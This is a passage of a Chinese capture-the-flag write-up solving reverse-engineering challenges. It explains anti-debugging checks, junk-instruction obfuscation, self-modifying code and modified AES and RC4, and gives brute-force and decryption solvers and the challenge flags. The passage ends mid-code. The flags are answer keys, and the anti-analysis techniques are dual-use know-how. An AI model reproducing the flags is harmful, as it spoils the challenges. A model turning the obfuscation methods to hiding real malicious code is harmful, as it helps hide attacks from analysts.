<span class="number">106</span>, <span class="number">122</span>, <span class="number">60</span>, <span class="number">92</span>, <span class="number">108</span>, <span class="number">91</span>, <span class="number">61</span>, <span class="number">51</span>, <span class="number">42</span>, <span class="number">62</span>, <span class="number">35</span>, <span class="number">38</span>, <span class="number">52</span>, <span class="number">67</span>, <span class="number">62</span>, <span class="number">122</span>, <span class="number">116</span>, <span class="number">48</span>, <span class="number">76</span>, <span class="number">50</span>, <span class="number">67</span>, <span class="number">51</span>, <span class="number">59</span>, <span class="number">41</span>, <span class="number">122</span>, <span class="number">45</span>, <span class="number">45</span>, <span class="number">51</span>, <span class="number">90</span>])</span><br><span class="line">    </span><br><span class="line">    p1 = caesar_encrypt(enc.decode(),-<span class="number">9</span>)</span><br><span class="line">    p2 = base85_decode(p1)</span><br><span class="line">    p3 = caesar_encrypt(p2,-<span class="number">7</span>)</span><br><span class="line">    flag = base45_decode_custom(p3)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h3 id="Flag值-3"><a href="#Flag值-3" class="headerlink" title="Flag值"></a>Flag值</h3><p><code>NSSCTF&#123;Th3y&#39;r3_a11_p1aY_Ba5e!&#125;</code></p><h2 id="TimeSpaceRescue"><a href="#TimeSpaceRescue" class="headerlink" title="TimeSpaceRescue"></a>TimeSpaceRescue</h2><h3 id="分析-4"><a href="#分析-4" class="headerlink" title="分析"></a>分析</h3><p>这题考点是反调试、花指令、时间爆破、AES魔改。</p><p>AES魔改的地方很明显，对比标准算法代码就可以马上找出，就多调用了两个函数对Key和加密数据进行了变换。</p><p>IDA反编译main函数，发现使用一个函数生成了一个数据，然后将生成数据与输入内容传入到加密函数内加密，最后比对。</p><p><img src="/2025/03/06/GHCTF2025WP/22.png" alt="alt text"></p><p>进入生成数据函数中，可以看到反调试代码，核心逻辑是获取当前时间。</p><p>时间结构体如下，可以看到使用memcpy将tm_mday开始往后三个整数数值复制到Src数组中，也就是复制了day、month、year数据。</p><p>然后调用sub_4021A0利用复制的时间数据生成16字节数据，可以观察得知sub_4021A0是MD5函数，如果不知道的话也可以直接把代码抠出来进行调用。</p><p>最后将MD5得到的字节都异或上0x14。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">tm</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> tm_sec;  <span class="comment">/*秒，正常范围0-59， 但允许至61*/</span></span><br><span class="line">    <span class="type">int</span> tm_min;  <span class="comment">/*分钟，0-59*/</span></span><br><span class="line">    <span class="type">int</span> tm_hour; <span class="comment">/*小时， 0-23*/</span></span><br><span class="line">    <span class="type">int</span> tm_mday; <span class="comment">/*日，即一个月中的第几天，1-31*/</span></span><br><span class="line">    <span class="type">int</span> tm_mon;  <span class="comment">/*月， 从一月算起，0-11*/</span></span><br><span class="line">    <span class="type">int</span> tm_year; <span class="comment">/*年， 从1900至今已经多少年*/</span></span><br><span class="line">    <span class="type">int</span> tm_wday; <span class="comment">/*星期，一周中的第几天， 从星期日算起，0-6*/</span></span><br><span class="line">    <span class="type">int</span> tm_yday; <span class="comment">/*从今年1月1日到目前的天数，范围0-365*/</span></span><br><span class="line">    <span class="type">int</span> tm_isdst;<span class="comment">/*日光节约时间的旗标*/</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><img src="/2025/03/06/GHCTF2025WP/23.png" alt="alt text"></p><p>这边看到函数结尾return 39有点奇怪，转到这个函数汇编界面，会发现函数底部有个花指令。</p><p>这边花指令的原理是二次计算，call完第一次计算结果不等于目标值，函数返回后还是从计算地址指令开始执行，进行了第二次计算，此时计算结果等于目标值进行jz跳转，用二次计算误导IDA认为该部分会直接ret而不会jz跳转执行下面部分命令。</p><p><img src="/2025/03/06/GHCTF2025WP/24.png" alt="alt text"></p><p>将红框内汇编nop掉，重新反编译会发现函数尾部又多了一次异或加密。</p><p>所以这边的密钥生成就是利用当前时间的年月日数据进行MD5，然后进行两次的异或计算得到最终的16字节密钥，结合题目描述，应该是需要爆破时间来得到有效密钥。</p><p><img src="/2025/03/06/GHCTF2025WP/25.png" alt="alt text"></p><p>接下来分析AES加密函数，发现函数尾部return 39，返回汇编解密，发现同样函数尾部有花指令。</p><p><img src="/2025/03/06/GHCTF2025WP/26.png" alt="alt text"></p><p>nop后就会发现尾部有个异或0x11的操作，跳到那个全部byte的交叉调用函数，发现是反调试，如果检测到调试，AES加密尾部就会把加密的数据再进行异或0x11处理，进行数据混淆。</p><p><img src="/2025/03/06/GHCTF2025WP/27.png" alt="alt text"></p><p><img src="/2025/03/06/GHCTF2025WP/28.png" alt="alt text"></p><p>通过比对标准算法队函数进行命名，发现多了这三个非AES标准流程的函数，</p><p><img src="/2025/03/06/GHCTF2025WP/29.png" alt="alt text"></p><p>第一个函数是传入了密钥数据，将相邻两个字节两两互换并异或上5。第三个函数也是和第一个相同的，不过处理的是加密完的密文。</p><p><img src="/2025/03/06/GHCTF2025WP/30.png" alt="alt text"></p><p>第二个函数是将要进行加密的16字节明文字节数据前后翻转，并都异或上0xF。</p><p><img src="/2025/03/06/GHCTF2025WP/31.png" alt="alt text"></p><p>至此所有流程分析完毕，可以复制一份标准算法直接进行解密，不过需要手动调用那两个函数进行再次逆向处理，然后配合月日爆破（年份题目描述已给，2024年）。</p><p><strong>注：该程序在初始化会进行三个反调试函数的调用，一个是调用IsDebuggerPresent和CheckRemoteDebuggerPresent，一个是刚刚上文提到的给全局一个Byte赋值，最后一个是对当前进程遍历查找恶意进程，对反调试感兴趣的可以根据我提供的这些函数去反向查找自行处理试试看。</strong></p><p>解密代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;aes.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;md5.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Reverse</span></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">int</span> __cdecl <span class="title">sub_401030</span><span class="params">(<span class="type">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [esp+0h] [ebp-Ch]</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// [esp+4h] [ebp-8h]</span></span><br><span class="line">    <span class="type">char</span> v4; <span class="comment">// [esp+Bh] [ebp-1h]</span></span><br><span class="line"></span><br><span class="line">    v3 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">15</span>; ; --i)</span><br><span class="line">    &#123;</span><br><span class="line">        result = v3;</span><br><span class="line">        <span class="keyword">if</span> (v3 &gt;= i)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        v4 = *(BYTE*)(v3 + a1) ^ <span class="number">0xF</span>;</span><br><span class="line">        *(BYTE*)(v3 + a1) = *(BYTE*)(i + a1) ^ <span class="number">0xF</span>;</span><br><span class="line">        *(BYTE*)(i + a1) = v4;</span><br><span class="line">        ++v3;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// SwapPairs</span></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">int</span> __cdecl <span class="title">sub_4010A0</span><span class="params">(<span class="type">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [esp+0h] [ebp-8h]</span></span><br><span class="line">    <span class="type">char</span> v3; <span class="comment">// [esp+7h] [ebp-1h]</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">0x10</span>; i += <span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        v3 = *(BYTE*)(i + a1) ^ <span class="number">5</span>;</span><br><span class="line">        *(BYTE*)(i + a1) = *(BYTE*)(i + a1 + <span class="number">1</span>) ^ <span class="number">5</span>;</span><br><span class="line">        *(BYTE*)(i + a1 + <span class="number">1</span>) = v3;</span><br><span class="line">        result = i + <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> month = <span class="number">0</span>; month &lt; <span class="number">12</span>; month++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> day = <span class="number">1</span>; day &lt;= <span class="number">31</span>; day++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">uint8_t</span> EncFlag[] =</span><br><span class="line">            &#123; </span><br><span class="line">                <span class="number">0xCD</span>,<span class="number">0x16</span>,<span class="number">0xDB</span>,<span class="number">0xB5</span>,<span class="number">0xD1</span>,<span class="number">0x02</span>,<span class="number">0xA4</span>,<span class="number">0x82</span>,<span class="number">0x8E</span>,<span class="number">0x59</span>,</span><br><span class="line">                <span class="number">0x73</span>,<span class="number">0x9E</span>,<span class="number">0x96</span>,<span class="number">0x26</span>,<span class="number">0x56</span>,<span class="number">0xF2</span>,<span class="number">0x16</span>,<span class="number">0x8E</span>,<span class="number">0x46</span>,<span class="number">0xF2</span>,</span><br><span class="line">                <span class="number">0x55</span>,<span class="number">0x7B</span>,<span class="number">0x92</span>,<span class="number">0x31</span>,<span class="number">0x30</span>,<span class="number">0xDC</span>,<span class="number">0xAA</span>,<span class="number">0x8A</span>,<span class="number">0xF3</span>,<span class="number">0x1C</span>,</span><br><span class="line">                <span class="number">0xA0</span>,<span class="number">0xAA</span> </span><br><span class="line">            &#125;;</span><br><span class="line"></span><br><span class="line">            <span class="type">uint8_t</span> Key[<span class="number">16</span>]&#123;&#125;;</span><br><span class="line">            <span class="type">int</span> TimeData[]&#123; day,month,<span class="number">2024</span> - <span class="number">1900</span> &#125;;</span><br><span class="line">            <span class="built_in">md5</span>((<span class="type">uint8_t</span>*)TimeData, <span class="number">12</span>, Key);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">                *(Key + i) = (Key[i] ^ <span class="number">0x114</span>) % <span class="number">256</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">                *(Key + i) = (Key[i] ^ <span class="number">0x11</span>) % <span class="number">256</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// swap key</span></span><br><span class="line">            <span class="built_in">sub_4010A0</span>((<span class="type">int</span>)Key);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// swap encData</span></span><br><span class="line">            <span class="built_in">sub_4010A0</span>((<span class="type">int</span>)EncFlag);</span><br><span class="line">            <span class="built_in">sub_4010A0</span>((<span class="type">int</span>)(EncFlag + <span class="number">16</span>));</span><br><span class="line"></span><br><span class="line">            <span class="comment">// decrypt</span></span><br><span class="line">            <span class="built_in">aesDecrypt</span>(Key, <span class="number">16</span>, EncFlag, <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// reverse encData</span></span><br><span class="line">            <span class="built_in">sub_401030</span>((<span class="type">int</span>)EncFlag);</span><br><span class="line">            <span class="built_in">sub_401030</span>((<span class="type">int</span>)(EncFlag + <span class="number">16</span>));</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (EncFlag[<span class="number">0</span>] == <span class="string">&#x27;N&#x27;</span></span><br><span class="line">                &amp;&amp; EncFlag[<span class="number">1</span>] == <span class="string">&#x27;S&#x27;</span></span><br><span class="line">                &amp;&amp; EncFlag[<span class="number">2</span>] == <span class="string">&#x27;S&#x27;</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%.32s\n&quot;</span>, EncFlag);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Flag值-4"><a href="#Flag值-4" class="headerlink" title="Flag值"></a>Flag值</h3><p><code>NSSCTF&#123;W0w_Y0u&#39;re_@n_AE5_M@5t3r&#125;</code></p><h2 id="Room-0"><a href="#Room-0" class="headerlink" title="Room 0"></a>Room 0</h2><h3 id="分析-5"><a href="#分析-5" class="headerlink" title="分析"></a>分析</h3><p>这题出的时候也是突发奇想，想把SMC和异常两个考点结合起来，于是出了一个这样强技巧性的题目，如果选手没有意识到考点就没办法解出。后续放出了两个Hint指出了是除0异常和SMC特性，题解就猛涨了（，技巧性确实会强一点。</p><p>IDA分析main函数，发现有个CPPEH_RECORD的异常结构体。</p><p><img src="/2025/03/06/GHCTF2025WP/32.png" alt="alt text"></p><p>回到汇编流程图会发现存在try和catch的捕获异常代码。</p><p><img src="/2025/03/06/GHCTF2025WP/33.png" alt="alt text"></p><p>将此处的jmp和ret都nop掉就可以在反编译代码段看到catch执行的代码部分。</p><p><img src="/2025/03/06/GHCTF2025WP/34.png" alt="alt text"></p><p>发现多了三个函数调用，就是catch部分执行的函数。</p><p><img src="/2025/03/06/GHCTF2025WP/35.png" alt="alt text"></p><p>第一个函数是经典的unhex函数（”1f2f”-&gt;0x1f2f）。</p><p><img src="/2025/03/06/GHCTF2025WP/36.png" alt="alt text"></p><p>第二个函数存在三处花指令，第一处和第三处直接全部nop，第二处对call按u，在跳过第一个字节按c重新分析下面部分代码，跳过0xE8字节。</p><p><img src="/2025/03/06/GHCTF2025WP/37.png" alt="alt text"></p><p><img src="/2025/03/06/GHCTF2025WP/38.png" alt="alt text"></p><p><img src="/2025/03/06/GHCTF2025WP/39.png" alt="alt text"></p><p>选中函数按P重新识别为函数进行反编译，发现这部分实际上就是SMC函数处，利用传进的密钥数据对.enc代码进行异或解密。</p><p>只不过传进的四字节整数密钥再函数开头做了字节倒序的处理，将四个字节顺序翻转，那么接下来任务就是找到密钥。</p><p><img src="/2025/03/06/GHCTF2025WP/40.png" alt="alt text"></p><p>回到main函数，发现程序要求输入key，然后调用一个call返回值要是0x11451419，然后利用0x11451419进行了一个RC4加密，最后对比一个字节数组，如果选手尝试解密这部分字节数组，会发现解出来的是FakeFlag。</p><p><code>NSSCTF&#123;FAKE_FAKE_FAKE_FAKE_FAKE&#125;</code></p><p><img src="/2025/03/06/GHCTF2025WP/41.png" alt="alt text"></p><p>进入sub_402000函数，可以看到是将输入的密钥调用unhex得到四字节数值，然后进行一个32轮的计算，在箭头处可以看到有一个除法计算，以及除数部分的一个变量与常数相减。</p><p>结合前面发现的异常捕获，可以知道这部分会有可能出现除数等于0，也就是触发除0异常。那么可以通过爆破的方式找到一个可以在计算过程中触发除0异常的值，那就是目标密钥了，因为SMC传入的密钥就是我们输入的密钥字串经过unhex的数据。</p><p><img src="/2025/03/06/GHCTF2025WP/42.png" alt="alt text"></p><p>但是经过实际检验，如果直接从0x0-0xffffffff爆破会出现非常多的符合值，无法确定哪个是真实密钥，就必须得缩小范围，这时会想到这个SMC加密函数存在特性，因为通过的是异或加密，所以可以根据原始字节与当前字节异或得到中间密钥。</p><p>跳到enc段开头，复制开头三个字节，然后随便找一个函数也复制开头三个字节，将两对数据进行异或，就会得到密钥的前三个字节。</p><p><img src="/2025/03/06/GHCTF2025WP/43.png" alt="alt text"></p><p><img src="/2025/03/06/GHCTF2025WP/44.png" alt="alt text"></p><p><img src="/2025/03/06/GHCTF2025WP/45.png" alt="alt text"></p><p>这下范围缩小至0x755ff000-0x755ff0ff之间，使用代码爆破即可得到密钥。</p><p>爆破代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __cdecl <span class="title">sub_4011C0</span><span class="params">(<span class="type">int</span> v2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// int v2&#123;&#125;;          // [esp+0h] [ebp-1Ch]</span></span><br><span class="line">    <span class="type">int</span> i&#123;&#125;;           <span class="comment">// [esp+4h] [ebp-18h]</span></span><br><span class="line">    <span class="type">int</span> v4&#123;&#125;;          <span class="comment">// [esp+8h] [ebp-14h]</span></span><br><span class="line">    <span class="type">int</span> v5&#123;&#125;;          <span class="comment">// [esp+Ch] [ebp-10h]</span></span><br><span class="line">    <span class="type">int</span> v6&#123;&#125;;          <span class="comment">// [esp+10h] [ebp-Ch]</span></span><br><span class="line">    <span class="type">int</span> v7&#123;&#125;;          <span class="comment">// [esp+10h] [ebp-Ch]</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> v8&#123;&#125;; <span class="comment">// [esp+14h] [ebp-8h]</span></span><br><span class="line">    <span class="type">int</span> v9&#123;&#125;;          <span class="comment">// [esp+18h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// v2 = sub_401100(Str);</span></span><br><span class="line">    <span class="comment">// if (!v2)</span></span><br><span class="line">    <span class="comment">// return 0;</span></span><br><span class="line">    v6 = <span class="number">0</span>;</span><br><span class="line">    v9 = v2;</span><br><span class="line">    v8 = (v2 &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xff</span>;</span><br><span class="line">    v5 = (v2 &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xff</span>;</span><br><span class="line">    v4 = (v2 &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xff</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">32</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        v7 = v6 * (v8 + <span class="number">1415881080</span>) * (v9 - <span class="number">1467486175</span>) * ((v8 - v9) ^ (v8 &gt;&gt; <span class="number">4</span>));</span><br><span class="line">        v5 = (v9 + v5) ^ (<span class="number">8</span> * v4);</span><br><span class="line">        v4 = (v9 + v8) ^ (<span class="number">8</span> * v5);</span><br><span class="line">        v8 = (v9 + v4) ^ (<span class="number">8</span> * v5);</span><br><span class="line">        v9 -= v4 + v5 + v8;</span><br><span class="line">        <span class="comment">// 若于1415881080相等，则会触发除0异常</span></span><br><span class="line">        <span class="keyword">if</span> (v9 == <span class="number">1415881080</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Key:%X\n&quot;</span>, v2);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        v6 = v7 + (v8 + <span class="number">1467486175</span>) * (((v8 - v9) ^ (<span class="type">unsigned</span> __int64)(v8 &gt;&gt; <span class="number">4</span>)) / (<span class="type">unsigned</span> <span class="type">int</span>)(v9 - <span class="number">1415881080</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> v9 ^ v6;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0x755ff000</span>; i &lt; <span class="number">0x755ff0ff</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">sub_4011C0</span>(i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得到密钥<code>755FF0D3</code></p><p>还原main函数nop的三行汇编，重新ida载入程序分析也可以，在异常except处断点，然后运行输入密钥，发现确实途中会触发div 0异常，然后断点会触发，</p><p><img src="/2025/03/06/GHCTF2025WP/46.png" alt="alt text"></p><p><img src="/2025/03/06/GHCTF2025WP/47.png" alt="alt text"></p><p>单步执行完SMC函数解密函数，然后跳到enc段的函数进行按c还原代码。</p><p><img src="/2025/03/06/GHCTF2025WP/48.png" alt="alt text"></p><p>还原途中会发现几个花指令，和之前遇到的一样类型的，同样去除就好，最后选中函数按p识别为函数进行反编译即可。</p><p><img src="/2025/03/06/GHCTF2025WP/49.png" alt="alt text"></p><p><img src="/2025/03/06/GHCTF2025WP/50.png" alt="alt text"></p><p>会发现是一个变种RC4，发现v18是RC4密钥，且最后加密完的值又与v18字节数组进行异或。</p><p><img src="/2025/03/06/GHCTF2025WP/51.png" alt="alt text"></p><p>v18不知道是什么数据，直接让代码执行到第一个for执行完处，就可以看到v18值，这8个字节就是密钥，编写代码将byte_405020字节数组进行解密即可得到密钥。</p><p><img src="/2025/03/06/GHCTF2025WP/52.png" alt="alt text"></p><p><img src="/2025/03/06/GHCTF2025WP/53.png" alt="alt text"></p><p>附：v18是从a2数据转换得来，a2数据实际是触发异常的时候通过栈进行获取异常前数据，实际数据是触发异常时候的v6值，传过来到enc段函数当作密钥进行加密。</p><p><img src="/2025/03/06/GHCTF2025WP/54.png" alt="alt text"></p><p><img src="/2025/03/06/GHCTF2025WP/55.png" alt="alt text"></p><p>解密代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> sbox[<span class="number">256</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">swap</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *a, <span class="type">unsigned</span> <span class="type">char</span> *b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> tmp = *a;</span><br><span class="line">    *a = *b;</span><br><span class="line">    *b = tmp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">init_sbox</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> key[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">unsigned</span> <span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)</span><br><span class="line">        sbox[i] = i;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> keyLen = <span class="built_in">strlen</span>((<span class="type">char</span> *)key);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> Ttable[<span class="number">256</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)</span><br><span class="line">        Ttable[i] = key[i % keyLen];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>, i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        j = (j + sbox[i] + Ttable[i]) % <span class="number">256</span>;</span><br><span class="line">        <span class="built_in">swap</span>(sbox + i, sbox + j);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">RC4</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> data[], <span class="type">unsigned</span> <span class="type">char</span> key[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> k, i = <span class="number">0</span>, j = <span class="number">0</span>, t;</span><br><span class="line">    <span class="built_in">init_sbox</span>(key);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> dataLen = <span class="number">32</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">unsigned</span> h = <span class="number">0</span>; h &lt; dataLen; h++)</span><br><span class="line">    &#123;</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">        j = (j + sbox[i]) % <span class="number">256</span>;</span><br><span class="line">        <span class="built_in">swap</span>(sbox + i, sbox + j);</span><br><span class="line">        t = (sbox[i] + sbox[j]) % <span class="number">256</span>;</span><br><span class="line">        k = sbox[t];</span><br><span class="line">        data[h] ^= k ^ key[i % <span class="number">8</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span 